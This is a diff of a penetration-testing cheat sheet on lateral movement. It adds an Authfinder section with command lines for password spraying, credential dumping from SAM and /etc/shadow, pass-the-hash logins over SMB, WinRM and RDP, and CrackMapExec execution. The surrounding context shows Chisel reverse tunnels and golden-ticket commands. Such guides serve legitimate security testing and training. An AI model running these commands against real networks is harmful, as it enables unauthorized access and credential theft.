@@ -8,10 +8,11 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 ## Table of Contents
 
 1. [Strategy and Attack Graphs](#1-strategy-and-attack-graphs)
-2. [Windows Lateral Movement](#2-windows-lateral-movement)
-3. [Linux Lateral Movement](#3-linux-lateral-movement)
-4. [AD-Specific Movement](#4-ad-specific-lateral-movement)
-5. [Port Forwarding and Pivoting](#5-port-forwarding-and-pivoting)
+2. [Cross-Platform Authentication Discovery](#2-cross-platform-authentication-discovery)
+3. [Windows Lateral Movement](#3-windows-lateral-movement)
+4. [Linux Lateral Movement](#4-linux-lateral-movement)
+5. [AD-Specific Movement](#5-ad-specific-lateral-movement)
+6. [Port Forwarding and Pivoting](#6-port-forwarding-and-pivoting)
 
 ---
 
@@ -22,37 +23,43 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 - [ ] Visualize Nodes & Edges → [1.1](#11-network-visualization-concept)
 - [ ] Identify High-Value Targets → [1.2](#12-high-value-target-prioritization)
 
+### Authentication Discovery
+
+- [ ] Multi-Protocol Validation → [2.1](#21-authfinder---multi-protocol-credential-validation)
+- [ ] Password Spraying → [2.1](#21-authfinder---multi-protocol-credential-validation)
+- [ ] Cross-Platform Testing → [2.1](#21-authfinder---multi-protocol-credential-validation)
+
 ### Windows Movement
-- [ ] PSExec/SMB Exec → [2.1](#21-psexec-style-execution)
-- [ ] WMI Lateral Move → [2.2](#22-wmi-based-movement)
-- [ ] WinRM/PS Remoting → [2.3](#23-winrm-and-powershell-remoting)
-- [ ] RDP Access → [2.4](#24-rdp-remote-desktop)
-- [ ] Service Execution → [2.5](#25-service-based-execution)
+- [ ] PSExec/SMB Exec → [3.1](#31-psexec-style-execution)
+- [ ] WMI Lateral Move → [3.2](#32-wmi-based-movement)
+- [ ] WinRM/PS Remoting → [3.3](#33-winrm-and-powershell-remoting)
+- [ ] RDP Access → [3.4](#34-rdp-remote-desktop)
+- [ ] Service Execution → [3.5](#35-service-based-execution)
 
 ### Linux Movement
-- [ ] SSH Access/Keys → [3.1](#31-ssh-access)
-- [ ] Harvest SSH Keys → [3.2](#32-ssh-agent-hijacking)
+- [ ] SSH Access/Keys → [4.1](#41-ssh-access)
+- [ ] Harvest SSH Keys → [4.2](#42-ssh-agent-hijacking)
 
 ### AD-Specific Movement
-- [ ] Pass-the-Hash (PtH) → [4.1](#41-pass-the-hash-pth-strategy)
-- [ ] Pass-the-Ticket (PtT) → [4.2](#42-pass-the-ticket-ptt-movement)
-- [ ] Golden/Silver Ticket → [4.2](#42-pass-the-ticket-ptt-movement)
-- [ ] Hunt Admin Sessions → [4.3](#43-admin-session-exploitation)
+- [ ] Pass-the-Hash (PtH) → [5.1](#51-pass-the-hash-pth-strategy)
+- [ ] Pass-the-Ticket (PtT) → [5.2](#52-pass-the-ticket-ptt-movement)
+- [ ] Golden/Silver Ticket → [5.2](#52-pass-the-ticket-ptt-movement)
+- [ ] Hunt Admin Sessions → [5.3](#53-admin-session-exploitation)
 
 ---
 
 ## 📋 Pivoting Checklist
 
 ### Setup & Discovery
-- [ ] Identify compromised host's network interfaces → [5](#5-port-forwarding-and-pivoting)
-- [ ] Discover internal subnets → [5](#5-port-forwarding-and-pivoting)
-- [ ] Choose tunneling method → [5](#5-port-forwarding-and-pivoting)
+- [ ] Identify compromised host's network interfaces → [6](#6-port-forwarding-and-pivoting)
+- [ ] Discover internal subnets → [6](#6-port-forwarding-and-pivoting)
+- [ ] Choose tunneling method → [6](#6-port-forwarding-and-pivoting)
 
 ### Tunneling Methods
-- [ ] Full subnet access (VPN-like) → [5.1](#51-ligolo-ng-recommended)
-- [ ] Single service forwarding → [5](#5-port-forwarding-and-pivoting)
-- [ ] SOCKS proxy for tools → [5](#5-port-forwarding-and-pivoting)
-- [ ] Multi-hop pivoting → [5](#5-port-forwarding-and-pivoting)
+- [ ] Full subnet access (VPN-like) → [6.1](#61-ligolo-ng-recommended)
+- [ ] Single service forwarding → [6](#6-port-forwarding-and-pivoting)
+- [ ] SOCKS proxy for tools → [6](#6-port-forwarding-and-pivoting)
+- [ ] Multi-hop pivoting → [6](#6-port-forwarding-and-pivoting)
 ---
 
 ## 1 Strategy and Attack Graphs
@@ -75,11 +82,277 @@ Focus movement on assets that shorten the path to domain impact:
 4. 🔧 **Jump Servers** - Administrative access points
 5. 📊 **Database Servers** - Data and credential storage
 
+--- 
+## 2 Cross-Platform Authentication Discovery
+
+### 2.1 Authfinder - Multi-Protocol Credential Validation
+
+**Overview:**
+
+Authfinder tests credentials across multiple protocols simultaneously to identify where authentication succeeds on both Windows and Linux targets.
+
+**Supported Protocols:**
+- **Windows**: SMB, WinRM, RDP, MSSQL
+- **Linux**: SSH
+- **Cross-Platform**: VNC
+```bash
+# Install
+git clone https://github.com/puzzlepeaches/authfinder.git
+cd authfinder
+pip3 install -r requirements.txt
+
+# Basic usage - test single credential against multiple hosts
+python3 authfinder.py -h <TARGET_IP> -u <USER> -p <PASSWORD>
+
+# Test against subnet
+python3 authfinder.py -h <SUBNET_CIDR> -u <USER> -p <PASSWORD>
+
+# Test multiple users/passwords from files
+python3 authfinder.py -h <SUBNET_CIDR> -U users.txt -P passwords.txt
+
+# Specify domain (Windows targets)
+python3 authfinder.py -h <TARGET_IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
+
+# Test specific protocols only
+python3 authfinder.py -h <TARGET_IP> -u <USER> -p <PASSWORD> --smb --winrm --rdp
+
+# Test all available protocols
+python3 authfinder.py -h <TARGET_IP> -u <USER> -p <PASSWORD> --smb --winrm --rdp --mssql --ssh --vnc
+
+# Pass-the-Hash (NTLM hash - Windows only)
+python3 authfinder.py -h <TARGET_IP> -u <USER> --hash <NTLM_HASH>
+
+# Output to file
+python3 authfinder.py -h <SUBNET_CIDR> -u <USER> -p <PASSWORD> -o results.txt
+
+# Verbose output
+python3 authfinder.py -h <TARGET_IP> -u <USER> -p <PASSWORD> -v
+
+# Specify custom ports
+python3 authfinder.py -h <TARGET_IP> -u <USER> -p <PASSWORD> --smb-port 445 --winrm-port 5985 --ssh-port 22
+
+# Thread control for faster scanning
+python3 authfinder.py -h <SUBNET_CIDR> -u <USER> -p <PASSWORD> -t 20
+
+# Continue on success (don't stop after first valid auth)
+python3 authfinder.py -h <SUBNET_CIDR> -U users.txt -P passwords.txt --continue-on-success
+
+# Local authentication (non-domain, Windows)
+python3 authfinder.py -h <TARGET_IP> -u administrator -p <PASSWORD> --local-auth
+```
+
+**Windows-Specific Usage:**
+```bash
+# Test Windows protocols only
+python3 authfinder.py -h <SUBNET_CIDR> -u <DOMAIN_USER> -p <PASSWORD> -d <DOMAIN> --smb --winrm --rdp --mssql
+
+# Pass-the-Hash across Windows subnet
+python3 authfinder.py -h <SUBNET_CIDR> -u administrator --hash <NTLM_HASH> --smb --winrm
+
+# Test local admin accounts
+python3 authfinder.py -h <SUBNET_CIDR> -u administrator -p <PASSWORD> --local-auth --smb --rdp
+
+# Domain credential validation
+python3 authfinder.py -h <SUBNET_CIDR> -u <DOMAIN_USER> -p <PASSWORD> -d <DOMAIN> -o valid_windows.txt
+```
+
+**Linux-Specific Usage:**
+```bash
+# Test SSH only across Linux subnet
+python3 authfinder.py -h <SUBNET_CIDR> -u root -p <PASSWORD> --ssh
+
+# Test multiple Linux users
+python3 authfinder.py -h <SUBNET_CIDR> -U linux_users.txt -p <PASSWORD> --ssh
+
+# Custom SSH port
+python3 authfinder.py -h <TARGET_IP> -u admin -p <PASSWORD> --ssh --ssh-port 2222
+
+# SSH key-based authentication (if supported)
+python3 authfinder.py -h <SUBNET_CIDR> -u <USER> --ssh-key /path/to/key --ssh
+```
+
+**Mixed Environment Usage:**
+```bash
+# Test all protocols across mixed Windows/Linux network
+python3 authfinder.py -h <SUBNET_CIDR> -u <USER> -p <PASSWORD> --smb --winrm --rdp --ssh --vnc
+
+# Separate domain and local credentials
+# Windows domain accounts
+python3 authfinder.py -h <SUBNET_CIDR> -u <DOMAIN_USER> -p <PASSWORD> -d <DOMAIN> --smb --winrm
+
+# Linux accounts
+python3 authfinder.py -h <SUBNET_CIDR> -u root -p <PASSWORD> --ssh
+
+# Test reused passwords across platforms
+python3 authfinder.py -h <SUBNET_CIDR> -P common_passwords.txt -u administrator --smb --winrm
+python3 authfinder.py -h <SUBNET_CIDR> -P common_passwords.txt -u root --ssh
+```
+
+**Interpreting Results:**
+```bash
+# Windows authentication results
+[+] SMB: DOMAIN\user:password @ 10.11.1.30 - SUCCESS
+[+] WinRM: DOMAIN\user:password @ 10.11.1.30 - SUCCESS
+[-] RDP: DOMAIN\user:password @ 10.11.1.30 - FAILED
+[-] MSSQL: DOMAIN\user:password @ 10.11.1.30 - FAILED
+
+# Linux authentication results
+[+] SSH: root:password @ 10.11.2.10 - SUCCESS
+[-] SSH: root:password @ 10.11.2.20 - FAILED
+
+# Use successful protocols for lateral movement
+# SMB + WinRM success → Use evil-winrm, psexec, or wmiexec
+# RDP success → Use xfreerdp
+# MSSQL success → Use impacket-mssqlclient
+# SSH success → Use ssh or evil-winrm (if it's actually WinRM)
+```
+
+**Practical Workflow:**
+```bash
+# 1. Discover credentials from initial compromise
+# Windows
+impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
+
+# Linux
+cat /etc/shadow
+john --wordlist=rockyou.txt shadow.txt
+
+# 2. Validate credentials across entire network
+python3 authfinder.py -h <SUBNET_CIDR> -u administrator -H <NTLM_HASH> --smb --winrm --rdp -o valid_hosts.txt
+python3 authfinder.py -h <SUBNET_CIDR> -u root -p <PASSWORD> --ssh -o valid_linux.txt
+
+# 3. Parse results and move laterally to each successful host
+
+# Windows targets with SMB
+impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
+
+# Windows targets with WinRM
+evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>
+
+# Windows targets with RDP
+xfreerdp /u:<USER> /pth:<NTLM_HASH> /v:<TARGET_IP> /cert:ignore
+
+# Linux targets with SSH
+ssh <USER>@<TARGET_IP>
+```
+
+**Password Spraying Workflow:**
+```bash
+# Build target lists
+nmap -p 445,5985,22 <SUBNET_CIDR> -oG - | grep "open" | awk '{print $2}' > targets.txt
+
+# Build username lists
+# Windows
+cat << EOF > windows_users.txt
+administrator
+admin
+<DOMAIN>admin
+svc_*
+EOF
+
+# Linux
+cat << EOF > linux_users.txt
+root
+admin
+administrator
+ubuntu
+centos
+EOF
+
+# Spray common passwords
+python3 authfinder.py -h targets.txt -U windows_users.txt -p 'Password123!' --smb --winrm --continue-on-success
+python3 authfinder.py -h targets.txt -U linux_users.txt -p 'Password123!' --ssh --continue-on-success
+
+# Spray seasonal passwords
+python3 authfinder.py -h targets.txt -U windows_users.txt -p 'Summer2024!' --smb --winrm
+python3 authfinder.py -h targets.txt -U windows_users.txt -p 'Winter2024!' --smb --winrm
+
+# Time-delay between attempts (avoid lockouts)
+for pass in $(cat passwords.txt); do
+    python3 authfinder.py -h <SUBNET_CIDR> -U users.txt -p "$pass" --smb --continue-on-success
+    sleep 1800  # 30 minute delay between password attempts
+done
+```
+
+**Integration with Other Tools:**
+```bash
+# Export results for CrackMapExec
+# Parse authfinder output to create target lists
+grep "SUCCESS" results.txt | grep "SMB" | awk '{print $5}' > smb_targets.txt
+
+# Use with CrackMapExec for execution
+crackmapexec smb smb_targets.txt -u <USER> -H <NTLM_HASH> -x "whoami"
+
+# Export results for further enumeration
+grep "SUCCESS" results.txt | grep "WinRM" | awk '{print $5}' > winrm_targets.txt
+
+# Connect with Evil-WinRM
+while read target; do
+    echo "[*] Connecting to $target"
+    evil-winrm -i $target -u <USER> -H <NTLM_HASH>
+done < winrm_targets.txt
+```
+
+**Alternative: CrackMapExec for Protocol-Specific Validation**
+```bash
+# CrackMapExec provides similar functionality but requires separate commands per protocol
+
+# Windows - SMB
+crackmapexec smb <SUBNET_CIDR> -u <USER> -p <PASSWORD>
+cme smb <SUBNET_CIDR> -u <USER> -H <NTLM_HASH>
+
+# Windows - WinRM
+crackmapexec winrm <SUBNET_CIDR> -u <USER> -p <PASSWORD>
+
+# Windows - RDP
+crackmapexec rdp <SUBNET_CIDR> -u <USER> -p <PASSWORD>
+
+# Windows - MSSQL
+crackmapexec mssql <SUBNET_CIDR> -u <USER> -p <PASSWORD>
+
+# Linux - SSH
+crackmapexec ssh <SUBNET_CIDR> -u <USER> -p <PASSWORD>
+
+# Password spray across multiple users
+crackmapexec smb <SUBNET_CIDR> -u users.txt -p <PASSWORD> --continue-on-success
+
+# Advantage of authfinder: Tests multiple protocols in one pass
+# Advantage of CME: More mature, better integration, execution capabilities
+```
+
+**Comparison: Authfinder vs CrackMapExec**
+
+| Feature | Authfinder | CrackMapExec |
+|---------|-----------|--------------|
+| **Multi-protocol testing** | ✅ Single command | ❌ Separate commands per protocol |
+| **Windows protocols** | SMB, WinRM, RDP, MSSQL | SMB, WinRM, RDP, MSSQL, LDAP |
+| **Linux protocols** | SSH | SSH, FTP |
+| **Cross-platform** | VNC | VNC |
+| **Pass-the-Hash** | ✅ | ✅ |
+| **Password spraying** | ✅ | ✅ |
+| **Execution commands** | ❌ | ✅ |
+| **Database tracking** | ❌ | ✅ |
+| **BloodHound integration** | ❌ | ✅ |
+| **Credential harvesting** | ❌ | ✅ (--sam, --lsa, --ntds) |
+| **Best for** | Quick multi-protocol validation | Full engagement workflow |
+
+**Use authfinder when:**
+- Testing credentials against mixed Windows/Linux environments
+- Need quick validation across multiple protocols
+- Want single-command multi-protocol testing
+- Performing initial credential mapping
+
+**Use CrackMapExec when:**
+- Need command execution after validation
+- Want to dump credentials (SAM, LSA, NTDS)
+- Require database tracking of credentials
+- Need BloodHound integration
+- Performing comprehensive Active Directory enumeration
 ---
 
-## 2 Windows Lateral Movement
+## 3 Windows Lateral Movement
 
-### 2.1 PSExec-Style Execution
+### 3.1 PSExec-Style Execution
 
 **Impacket PSExec (Linux)**
 
@@ -157,7 +430,7 @@ set RHOSTS <TARGET_IP>
 exploit
 ```
 
-### 2.2 WMI-Based Movement
+### 3.2 WMI-Based Movement
 
 **Impacket WMIExec**
 
@@ -226,7 +499,7 @@ cme wmi <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' -x "hostname"
 crackmapexec wmi <TARGET_IP> -u <USER> -H <NTLM_HASH> -x "ipconfig"
 ```
 
-### 2.3 WinRM and PowerShell Remoting
+### 3.3 WinRM and PowerShell Remoting
 
 **Service Detection**
 
@@ -327,7 +600,7 @@ crackmapexec winrm <TARGET_IP> -u <USER> -H <NTLM_HASH> -x "ipconfig"
 crackmapexec winrm <TARGET_IP> -u <USER> -p '<PASSWORD>' -X '$env:computername'
 ```
 
-### 2.4 RDP (Remote Desktop)
+### 3.4 RDP (Remote Desktop)
 
 **Service Detection**
 
@@ -437,7 +710,7 @@ cme rdp <SUBNET_CIDR> -u <USER> -p '<PASSWORD>'
 crackmapexec rdp <TARGET_IP> -u <USER> -p '<PASSWORD>' --screenshot
 ```
 
-### 2.5 Service-Based Execution
+### 3.5 Service-Based Execution
 
 **SC Manager Methods**
 
@@ -551,9 +824,9 @@ dcomexec.py -object MMC20 <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
 
 ---
 
-## 3 Linux Lateral Movement
+## 4 Linux Lateral Movement
 
-### 3.1 SSH Access
+### 4.1 SSH Access
 
 **Basic SSH Connections**
 
@@ -666,7 +939,7 @@ ssh -L 8080:localhost:80 -L 3306:localhost:3306 user@10.11.2.10
 ssh -f -N -L 8080:localhost:80 user@10.11.2.10
 ```
 
-### 3.2 SSH Agent Hijacking
+### 4.2 SSH Agent Hijacking
 
 ```bash
 # Check for running SSH agent
@@ -695,7 +968,7 @@ dump memory /tmp/agent_dump 0x[ADDRESS] 0x[ADDRESS]+1000000
 ```
 
 
-### 3.4 Alternative Linux Movement
+### 4.3 Alternative Linux Movement
 
 **RSH/Rexec (Legacy)**
 
@@ -791,9 +1064,9 @@ find /tmp/tmux-* 2>/dev/null
 
 ---
 
-## 4 AD-Specific Lateral Movement
+## 5 AD-Specific Lateral Movement
 
-### 4.1 Pass-the-Hash (PtH) Strategy
+### 5.1 Pass-the-Hash (PtH) Strategy
 
 **Understanding Pass-the-Hash**
 
@@ -819,7 +1092,7 @@ crackmapexec smb 10.11.1.0/24 -u user -H NTLM_HASH --local-auth
 cme smb 10.11.1.0/24 -u user -H NTLM_HASH
 ```
 
-### 4.2 Pass-the-Ticket (PtT) Movement
+### 5.2 Pass-the-Ticket (PtT) Movement
 
 **Understanding Kerberos Tickets**
 
@@ -993,7 +1266,7 @@ mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXX
 impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local -spn cifs/server01.domain.local Administrator
 ```
 
-### 4.3 Admin Session Exploitation
+### 5.3 Admin Session Exploitation
 
 **Session Enumeration**
 
@@ -1077,7 +1350,7 @@ Invoke-TokenManipulation -Enumerate
 .\Rubeus.exe dump /luid:0x3e7
 ```
 
-### 4.4 BloodHound-Informed Movement
+### 5.4 BloodHound-Informed Movement
 
 **BloodHound Analysis Queries**
 
@@ -1197,7 +1470,7 @@ Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Obje
 # Can do anything - similar to GenericAll
 ```
 
-## 5 Port Forwarding and Pivoting
+## 6 Port Forwarding and Pivoting
 
 ### Understanding Pivoting Terminology
 #### Local Port Forwarding
@@ -1318,7 +1591,7 @@ Get-NetNeighbor
 | **Best For** | Full access | Quick pivots | Windows targets | Pentests | Tool wrapping |
 ---
 
-## 5.1 Ligolo-ng (Recommended)
+## 6.1 Ligolo-ng (Recommended)
 
 **Why Ligolo-ng:**
 - Creates a full Layer 3 tunnel (TUN interface)
@@ -1472,7 +1745,7 @@ sudo ip route add <INTERNAL_SUBNET_B> dev ligolo
 
 ---
 
-## 5.2 SSH Tunneling
+## 6.2 SSH Tunneling
 
 **Why SSH:**
 - Available on most Linux systems
@@ -1622,7 +1895,7 @@ plink.exe -N -L <LPORT>:<RHOST>:<RPORT> <USER>@<PIVOT_A_IP> -pw password
 
 ---
 
-## 5.3 Chisel
+## 6.3 Chisel
 
 **Why Chisel:**
 - Single binary (easy to transfer)
@@ -1710,7 +1983,7 @@ start /B chisel.exe client <LHOST>:8000 R:1080:socks
 
 ---
 
-## 5.4 Metasploit Framework
+## 6.4 Metasploit Framework
 
 **Why Metasploit:**
 - Integrated with Meterpreter sessions
@@ -1839,7 +2112,7 @@ msf6 auxiliary(scanner/portscan/tcp) > run
 
 ---
 
-## 5.5 Proxychains
+## 6.5 Proxychains
 
 **Why Proxychains:**
 - Forces network traffic through SOCKS/HTTP proxies
@@ -1950,7 +2223,7 @@ Works with:
 
 ---
 
-## 5.6 Additional Tools
+## 6.6 Additional Tools
 
 ### Socat
 
